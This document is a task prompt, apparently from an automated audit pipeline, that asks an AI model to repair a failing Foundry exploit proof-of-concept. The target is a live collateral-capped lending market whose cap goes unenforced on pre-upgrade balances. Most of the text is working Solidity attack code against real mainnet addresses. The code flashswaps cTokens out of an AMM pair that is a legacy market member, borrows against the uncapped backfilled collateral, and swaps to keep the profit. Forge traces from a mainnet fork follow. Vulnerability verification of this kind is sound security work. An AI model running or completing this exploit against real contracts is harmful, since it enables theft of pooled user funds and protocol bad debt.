You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Collateral cap is unenforceable for pre-upgrade balances in upgraded collateral-cap markets
- claim: When a live market is upgraded to `CCollateralCapErc20CheckRepayDelegate`, `_becomeImplementation` initializes `internalCash` but does not backfill `totalCollateralTokens` or per-user collateral state. Uninitialized legacy accounts still have their full `accountTokens` counted by `getCTokenBalanceInternal`, but are omitted from `totalCollateralTokens`. Later, `initializeAccountCollateralTokens` copies a legacy member's entire historical balance into `accountCollateralTokens` and adds it to `totalCollateralTokens` without enforcing `collateralCap`, whereas only fresh collateral growth through `increaseUserCollateralInternal` is cap-checked.
- impact: Governance cannot rely on the configured collateral cap after upgrading an already-live market. Legacy suppliers can continue using uncapped balances as collateral, and once they touch the market those balances are backfilled into collateral accounting without any cap enforcement. This defeats the intended market-wide collateral limit and can let the protocol support materially more borrowable collateral than intended, increasing insolvency and bad-debt risk.
- exploit_paths: ["Upgrade an existing live `CErc20Delegator` market to the collateral-cap implementation.", "Because `_becomeImplementation` does not migrate collateral accounting, `totalCollateralTokens` starts below actual collateral usage while legacy balances still count in account snapshots.", "A pre-upgrade supplier later mints, redeems, transfers, or is involved in a seizure, triggering `initializeAccountCollateralTokens`.", "That function credits the account's full legacy balance as collateral and increments `totalCollateralTokens` without applying the configured `collateralCap`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IPriceOracleLike {
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

    function getAccountLiquidity(address account)
        external
        view
        returns (
            uint256,
            uint256,
            uint256
        );

    function oracle() external view returns (address);

    function markets(address cToken)
        external
        view
        returns (
            bool,
            uint256,
            bool,
            uint8
        );

    function checkMembership(address account, address cToken) external view returns (bool);
}

interface ICTokenLike {
    function underlying() external view returns (address);

    function comptroller() external view returns (address);

    function implementation() external view returns (address);

    function collateralCap() external view returns (uint256);

    function totalCollateralTokens() external view returns (uint256);

    function accountCollateralTokens(address account) external view returns (uint256);

    function isCollateralTokenInit(address account) external view returns (bool);

    function balanceOf(address owner) external view returns (uint256);

    function getCash() external view returns (uint256);

    function redeem(uint256 redeemTokens) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function exchangeRateStored() external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6;
    address public constant VULNERABLE_IMPLEMENTATION = 0x96Cc0F947b6C8F4675159Ea03144f8c17d5A2fC8;

    address private constant FACTORY_UNISWAP_V2 = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant FACTORY_SUSHISWAP = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    string internal constant PATH_0 =
        "Upgrade an existing live CErc20Delegator market to the collateral-cap implementation.";
    string internal constant PATH_1 =
        "Because _becomeImplementation does not migrate collateral accounting, totalCollateralTokens starts below actual collateral usage while legacy balances still count in account snapshots.";
    string internal constant PATH_2 =
        "A pre-upgrade supplier later mints, redeems, transfers, or is involved in a seizure, triggering initializeAccountCollateralTokens.";
    string internal constant PATH_3 =
        "That function credits the account's full legacy balance as collateral and increments totalCollateralTokens without applying the configured collateralCap.";

    uint8 public constant REASON_NONE = 0;
    uint8 public constant REASON_INVALID_TARGET = 1;
    uint8 public constant REASON_NO_ROUTE = 2;
    uint8 public constant REASON_NO_BACKFILL = 3;
    uint8 public constant REASON_NO_LIQUIDITY = 4;
    uint8 public constant REASON_BORROW_FAILED = 5;
    uint8 public constant REASON_REPAY_SWAP_FAILED = 6;
    uint8 public constant REASON_ENTER_MARKET_FAILED = 7;

    uint256 private constant MIN_PROFIT = 1e17;
    bytes32 private constant V2_CALLBACK_SUCCESS = keccak256("V2_CALLBACK_SUCCESS");

    address private immutable _profitToken;
    bool private immutable _hypothesisValidated;

    uint256 private _profitAmount;
    bool private _executed;

    uint8 public lastFailureReason;
    uint256 public collateralCapObserved;
    uint256 public totalCollateralTokensBefore;
    uint256 public totalCollateralTokensAfter;
    uint256 public verifierCTokenBalanceBefore;
    uint256 public verifierCollateralBefore;
    uint256 public verifierCollateralAfter;
    uint256 public accountLiquidityAfter;
    uint256 public accountShortfallAfter;
    uint256 public borrowAttemptAmount;
    uint256 public borrowResultCode;
    address public chosenBuyPair;
    address public chosenExitPair;
    address public chosenQuoteToken;
    uint256 public chosenCAmpOut;
    uint256 public chosenQuoteRepay;
    uint256 public chosenAmpRepay;
    uint256 public chosenProjectedProfit;

    uint256 private _scanExchangeRate;
    uint256 private _scanCollateralFactor;
    uint256 private _scanCash;
    uint256 private _scanAmpBalanceBefore;

    constructor() {
        ICTokenLike target = ICTokenLike(TARGET);
        _profitToken = target.underlying();
        _hypothesisValidated =
            target.implementation() == VULNERABLE_IMPLEMENTATION &&
            target.collateralCap() > 0;
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        ICTokenLike target = ICTokenLike(TARGET);
        IComptrollerLike comptroller = IComptrollerLike(target.comptroller());

        collateralCapObserved = target.collateralCap();
        totalCollateralTokensBefore = target.totalCollateralTokens();
        verifierCTokenBalanceBefore = target.balanceOf(address(this));
        verifierCollateralBefore = target.accountCollateralTokens(address(this));

        if (!_hypothesisValidated || collateralCapObserved == 0) {
            lastFailureReason = REASON_INVALID_TARGET;
            return;
        }

        /*
         * PATH_0 / PATH_1:
         * The verifier uses the already-upgraded live market exactly as deployed on the fork block.
         * It searches for a public AMM route where the AMM pair itself is a legacy market member that
         * still holds target cTokens while `isCollateralTokenInit[pair] == false`.
         *
         * Such a pair is a pre-upgrade supplier whose historical target balance still counts in market
         * snapshots, but whose collateral accounting has not yet been backfilled.
         */
        uint256 ampBalanceBefore = _balanceOf(_profitToken, address(this));
        bool success = _scanAndExecuteRoutes(target, comptroller, ampBalanceBefore);
        if (!success) {
            if (lastFailureReason == REASON_NONE) {
                lastFailureReason = REASON_NO_ROUTE;
            }
            return;
        }

        totalCollateralTokensAfter = target.totalCollateralTokens();
        verifierCollateralAfter = target.accountCollateralTokens(address(this));

        uint256 ampBalanceAfter = _balanceOf(_profitToken, address(this));
        if (ampBalanceAfter > ampBalanceBefore) {
            _profitAmount = ampBalanceAfter - ampBalanceBefore;
        }
    }

    function startRoute(
        address buyPair,
        address quoteToken,
        address exitPair,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 ampRepay,
        uint256 minProfitRequired
    ) external {
        require(msg.sender == address(this), "self only");

        /*
         * The verifier must already be a market member before the incoming cToken transfer arrives.
         * Otherwise `transferTokens` initializes the receiver with `checkMembership == false`, sets
         * `isCollateralTokenInit[receiver] = true`, and the received cTokens become permanent buffer
         * tokens instead of borrowable collateral. Pre-entering the market does not alter the finding's
         * causality: the source legacy supplier is still the account whose transfer touch triggers the
         * uncapped backfill via `initializeAccountCollateralTokens`.
         */
        _enterTargetMarket();

        uint256 ampBefore = _balanceOf(_profitToken, address(this));
        chosenBuyPair = buyPair;
        chosenExitPair = exitPair;
        chosenQuoteToken = quoteToken;
        chosenCAmpOut = cAmpOut;
        chosenQuoteRepay = quoteRepay;
        chosenAmpRepay = ampRepay;
        chosenProjectedProfit = minProfitRequired;

        (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(buyPair, TARGET, cAmpOut);
        IUniswapV2PairLike(buyPair).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(buyPair, quoteToken, exitPair, quoteRepay, ampRepay)
        );

        uint256 ampAfter = _balanceOf(_profitToken, address(this));
        require(ampAfter >= ampBefore + minProfitRequired, "route not profitable enough");
    }

    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        _handleV2Callback(data);
    }

    function sushiCall(
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external {
        _handleV2Callback(data);
    }

    function _handleV2Callback(bytes calldata data) internal {
        (address buyPair, address quoteToken, address exitPair, uint256 quoteRepay, uint256 ampRepay) = abi.decode(
            data,
            (address, address, address, uint256, uint256)
        );
        require(msg.sender == buyPair, "bad callback sender");

        ICTokenLike target = ICTokenLike(TARGET);
        IComptrollerLike comptroller = IComptrollerLike(target.comptroller());

        uint256 borrowedAmp = _borrowAgainstReceivedCollateral(target, comptroller);
        _repayFlashswap(buyPair, quoteToken, exitPair, quoteRepay, ampRepay, borrowedAmp);
    }

    function _enterTargetMarket() internal {
        address[] memory markets = new address[](1);
        markets[0] = TARGET;
        uint256[] memory enterResults = IComptrollerLike(ICTokenLike(TARGET).comptroller()).enterMarkets(markets);
        if (enterResults.length == 0 || enterResults[0] != 0) {
            lastFailureReason = REASON_ENTER_MARKET_FAILED;
            revert("enter market failed");
        }
    }

    function _borrowAgainstReceivedCollateral(
        ICTokenLike target,
        IComptrollerLike comptroller
    ) internal returns (uint256 borrowedAmp) {
        /*
         * PATH_2:
         * The AMM pair is the legacy supplier being touched. The flashswap transfers cTokens out of that
         * legacy member, which routes through `transferTokens` and therefore `initializeAccountCollateralTokens`.
         * This is a realistic public on-chain action: an ordinary V2-style swap.
         */
        verifierCollateralAfter = target.accountCollateralTokens(address(this));
        totalCollateralTokensAfter = target.totalCollateralTokens();
        if (verifierCollateralAfter == 0 || totalCollateralTokensAfter <= totalCollateralTokensBefore) {
            lastFailureReason = REASON_NO_BACKFILL;
            revert("no backfill");
        }

        address[] memory markets = new address[](1);
        markets[0] = TARGET;
        uint256[] memory enterResults = comptroller.enterMarkets(markets);
        require(enterResults.length != 0 && enterResults[0] == 0, "enter market failed");

        (uint256 err, uint256 liquidity, uint256 shortfall) = comptroller.getAccountLiquidity(address(this));
        accountLiquidityAfter = liquidity;
        accountShortfallAfter = shortfall;
        if (err != 0 || liquidity == 0 || shortfall != 0) {
            lastFailureReason = REASON_NO_LIQUIDITY;
            revert("no liquidity");
        }

        uint256 price = IPriceOracleLike(comptroller.oracle()).getUnderlyingPrice(TARGET);
        uint256 cash = target.getCash();
        require(price != 0 && cash != 0, "bad price or cash");

        uint256 maxBorrowFromLiquidity = (liquidity * 1e18) / price;
        uint256 cappedByCash = (cash * 9990) / 10000;
        borrowedAmp = (maxBorrowFromLiquidity * 9950) / 10000;
        if (borrowedAmp > cappedByCash) {
            borrowedAmp = cappedByCash;
        }
        require(borrowedAmp != 0, "borrow zero");

        borrowAttemptAmount = borrowedAmp;
        borrowResultCode = target.borrow(borrowedAmp);
        if (borrowResultCode != 0) {
            lastFailureReason = REASON_BORROW_FAILED;
            revert("borrow failed");
        }
    }

    function _repayFlashswap(
        address buyPair,
        address quoteToken,
        address exitPair,
        uint256 quoteRepay,
        uint256 ampRepay,
        uint256 borrowedAmp
    ) internal {
        /*
         * PATH_3:
         * The flashswap touch above has now backfilled the legacy supplier's full historical cToken balance
         * into collateral accounting without any collateral-cap enforcement. The verifier then borrows against
         * the cTokens it just received from that legacy member. To settle the flashswap realistically, it uses
         * a public AMM swap of the borrowed AMP into the quote asset required by the original V2 pair.
         */
        if (quoteToken == _profitToken) {
            require(borrowedAmp > quoteRepay, "insufficient direct repay");
            _safeTransfer(_profitToken, buyPair, quoteRepay);
            return;
        }

        if (exitPair == address(0) || ampRepay == 0 || borrowedAmp <= ampRepay) {
            lastFailureReason = REASON_REPAY_SWAP_FAILED;
            revert("no repay path");
        }

        _safeTransfer(_profitToken, exitPair, ampRepay);
        (uint256 exitAmount0Out, uint256 exitAmount1Out) = _pairOutAmounts(exitPair, quoteToken, quoteRepay);
        IUniswapV2PairLike(exitPair).swap(exitAmount0Out, exitAmount1Out, address(this), new bytes(0));

        uint256 quoteBalance = _balanceOf(quoteToken, address(this));
        if (quoteBalance < quoteRepay) {
            lastFailureReason = REASON_REPAY_SWAP_FAILED;
            revert("quote shortfall");
        }
        _safeTransfer(quoteToken, buyPair, quoteRepay);
    }

    function _scanAndExecuteRoutes(
        ICTokenLike target,
        IComptrollerLike comptroller,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        (, uint256 collateralFactorMantissa, , ) = comptroller.markets(TARGET);
        if (collateralFactorMantissa == 0) {
            lastFailureReason = REASON_NO_LIQUIDITY;
            return false;
        }

        uint256 exchangeRate = target.exchangeRateStored();
        uint256 cash = target.getCash();
        if (exchangeRate == 0 || cash == 0) {
            lastFailureReason = REASON_NO_LIQUIDITY;
            return false;
        }

        _scanExchangeRate = exchangeRate;
        _scanCollateralFactor = collateralFactorMantissa;
        _scanCash = cash;
        _scanAmpBalanceBefore = ampBalanceBefore;

        for (uint256 buyFactoryIndex = 0; buyFactoryIndex < 2; buyFactoryIndex++) {
            address buyFactory = _factoryAt(buyFactoryIndex);

            for (uint256 quoteIndex = 0; quoteIndex < 5; quoteIndex++) {
                address quoteToken = _quoteAt(quoteIndex);
                if (_tryQuoteRoutes(buyFactory, quoteToken, target, comptroller)) {
                    return true;
                }
            }
        }

        lastFailureReason = REASON_NO_ROUTE;
        return false;
    }

    function _tryQuoteRoutes(
        address buyFactory,
        address quoteToken,
        ICTokenLike target,
        IComptrollerLike comptroller
    ) internal returns (bool) {
        address buyPair = IUniswapV2FactoryLike(buyFactory).getPair(TARGET, quoteToken);
        if (buyPair == address(0)) {
            return false;
        }
        if (!_isLegacyMemberRouteCandidate(buyPair, target, comptroller)) {
            return false;
        }

        (uint256 reserveQuote, uint256 reserveCAmp) = _pairReservesFor(buyPair, quoteToken, TARGET);
        if (reserveQuote == 0 || reserveCAmp == 0) {
            return false;
        }

        for (uint256 sizeIndex = 0; sizeIndex < 9; sizeIndex++) {
            uint256 cAmpOut = reserveCAmp / _sizeDivisorAt(sizeIndex);
            if (cAmpOut == 0 || cAmpOut >= reserveCAmp) {
                continue;
            }

            uint256 quoteRepay = _getAmountIn(cAmpOut, reserveQuote, reserveCAmp);
            if (quoteRepay == 0 || quoteRepay >= reserveQuote) {
                continue;
            }

            uint256 estimatedBorrow = _estimateBorrowableUnderlying(
                cAmpOut,
                _scanExchangeRate,
                _scanCollateralFactor,
                _scanCash
            );
            if (estimatedBorrow <= MIN_PROFIT) {
                continue;
            }

            if (quoteToken == _profitToken) {
                if (_attemptDirectRoute(buyPair, quoteToken, cAmpOut, quoteRepay, estimatedBorrow, _scanAmpBalanceBefore)) {
                    return true;
                }
                continue;
            }

            if (_tryExitRoutes(quoteToken, buyPair, cAmpOut, quoteRepay, estimatedBorrow, _scanAmpBalanceBefore)) {
                return true;
            }
        }

        return false;
    }

    function _tryExitRoutes(
        address quoteToken,
        address buyPair,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 estimatedBorrow,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        for (uint256 exitFactoryIndex = 0; exitFactoryIndex < 2; exitFactoryIndex++) {
            address exitFactory = _factoryAt(exitFactoryIndex);
            address exitPair = IUniswapV2FactoryLike(exitFactory).getPair(_profitToken, quoteToken);
            if (exitPair == address(0)) {
                continue;
            }

            (uint256 reserveAmp, uint256 reserveQuoteOut) = _pairReservesFor(exitPair, _profitToken, quoteToken);
            if (reserveAmp == 0 || reserveQuoteOut == 0 || quoteRepay >= reserveQuoteOut) {
                continue;
            }

            uint256 ampRepay = _getAmountIn(quoteRepay, reserveAmp, reserveQuoteOut);
            if (ampRepay == 0 || ampRepay >= estimatedBorrow) {
                continue;
            }

            uint256 projectedProfit = estimatedBorrow - ampRepay;
            if (projectedProfit < MIN_PROFIT) {
                continue;
            }

            if (
                _attemptExitRoute(
                    buyPair,
                    quoteToken,
                    exitPair,
                    cAmpOut,
                    quoteRepay,
                    ampRepay,
                    ampBalanceBefore
                )
            ) {
                return true;
            }
        }

        return false;
    }

    function _attemptExitRoute(
        address buyPair,
        address quoteToken,
        address exitPair,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 ampRepay,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        try this.startRoute(buyPair, quoteToken, exitPair, cAmpOut, quoteRepay, ampRepay, MIN_PROFIT) {
            return _balanceOf(_profitToken, address(this)) > ampBalanceBefore;
        } catch {
            return false;
        }
    }

    function _attemptDirectRoute(
        address buyPair,
        address quoteToken,
        uint256 cAmpOut,
        uint256 quoteRepay,
        uint256 estimatedBorrow,
        uint256 ampBalanceBefore
    ) internal returns (bool) {
        uint256 projectedProfit = estimatedBorrow > quoteRepay ? estimatedBorrow - quoteRepay : 0;
        if (projectedProfit < MIN_PROFIT) {
            return false;
        }

        try this.startRoute(buyPair, quoteToken, address(0), cAmpOut, quoteRepay, quoteRepay, MIN_PROFIT) {
            return _balanceOf(_profitToken, address(this)) > ampBalanceBefore;
        } catch {
            return false;
        }
    }

    function _estimateBorrowableUnderlying(
        uint256 cTokenAmount,
        uint256 exchangeRate,
        uint256 collateralFactorMantissa,
        uint256 cash
    ) internal pure returns (uint256) {
        uint256 underlyingValue = (cTokenAmount * exchangeRate) / 1e18;
        uint256 borrowable = (underlyingValue * collateralFactorMantissa) / 1e18;
        uint256 cashLimited = (cash * 9950) / 10000;
        return borrowable < cashLimited ? borrowable : cashLimited;
    }

    function _isLegacyMemberRouteCandidate(
        address account,
        ICTokenLike target,
        IComptrollerLike comptroller
    ) internal view returns (bool) {
        if (target.balanceOf(account) == 0) {
            return false;
        }
        if (target.isCollateralTokenInit(account)) {
            return false;
        }
        if (!comptroller.checkMembership(account, TARGET)) {
            return false;
        }
        return true;
    }

    function _pairOutAmounts(
        address pair,
        address outToken,
        uint256 outAmount
    ) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        if (IUniswapV2PairLike(pair).token0() == outToken) {
            amount0Out = outAmount;
            amount1Out = 0;
        } else {
            amount0Out = 0;
            amount1Out = outAmount;
        }
    }

    function _pairReservesFor(
        address pair,
        address tokenIn,
        address tokenOut
    ) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == tokenIn && IUniswapV2PairLike(pair).token1() == tokenOut) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(IUniswapV2PairLike(pair).token0() == tokenOut && IUniswapV2PairLike(pair).token1() == tokenIn, "pair mismatch");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) internal pure returns (uint256) {
        if (amountOut == 0 || reserveIn == 0 || reserveOut <= amountOut) {
            return 0;
        }
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _safeTransfer(
        address token,
        address to,
        uint256 amount
    ) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        return IERC20Like(token).balanceOf(account);
    }

    function _factoryAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return FACTORY_UNISWAP_V2;
        }
        return FACTORY_SUSHISWAP;
    }

    function _quoteAt(uint256 index) internal view returns (address) {
        if (index == 0) {
            return _profitToken;
        }
        if (index == 1) {
            return WETH;
        }
        if (index == 2) {
            return DAI;
        }
        if (index == 3) {
            return USDC;
        }
        return USDT;
    }

    function _sizeDivisorAt(uint256 index) internal pure returns (uint256) {
        if (index == 0) return 200000;
        if (index == 1) return 100000;
        if (index == 2) return 50000;
        if (index == 3) return 20000;
        if (index == 4) return 10000;
        if (index == 5) return 5000;
        if (index == 6) return 2000;
        if (index == 7) return 1000;
        return 500;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return
            "historical CErc20Delegator upgrade -> missing collateral migration -> legacy supplier V2 transfer touch backfills uncapped collateral -> borrow against collateralized cTokens received from that legacy supplier";
    }

    function exploitPathAt(uint256 index) external pure returns (string memory) {
        if (index == 0) {
            return PATH_0;
        }
        if (index == 1) {
            return PATH_1;
        }
        if (index == 2) {
            return PATH_2;
        }
        if (index == 3) {
            return PATH_3;
        }

        revert("path out of bounds");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 3.26s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 137773)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xfF20817765cB7f73d4bde2e66e067E58D11095C2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 13920

Traces:
  [137773] FlawVerifierTest::testExploit()
    ├─ [366] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xfF20817765cB7f73d4bde2e66e067E58D11095C2
    ├─ [2597] 0xfF20817765cB7f73d4bde2e66e067E58D11095C2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [98217] FlawVerifier::executeOnOpportunity()
    │   ├─ [2449] 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258
    │   ├─ [7700] 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6::collateralCap() [staticcall]
    │   │   ├─ [2387] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::collateralCap() [delegatecall]
    │   │   │   └─ ← [Return] 100000000000000000 [1e17]
    │   │   └─ ← [Return] 100000000000000000 [1e17]
    │   ├─ [3225] 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6::totalCollateralTokens() [staticcall]
    │   │   ├─ [2411] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::totalCollateralTokens() [delegatecall]
    │   │   │   └─ ← [Return] 1218382802034500652 [1.218e18]
    │   │   └─ ← [Return] 1218382802034500652 [1.218e18]
    │   ├─ [5733] 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [4210] 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a082310000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [2553] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [3307] 0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6::accountCollateralTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2491] 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754::accountCollateralTokens(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [366] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xfF20817765cB7f73d4bde2e66e067E58D11095C2
    ├─ [597] 0xfF20817765cB7f73d4bde2e66e067E58D11095C2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xfF20817765cB7f73d4bde2e66e067E58D11095C2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 13125070 [1.312e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 13920 [1.392e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 766.08ms (160.57ms CPU time)

Ran 1 test suite in 978.78ms (766.08ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 137773)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
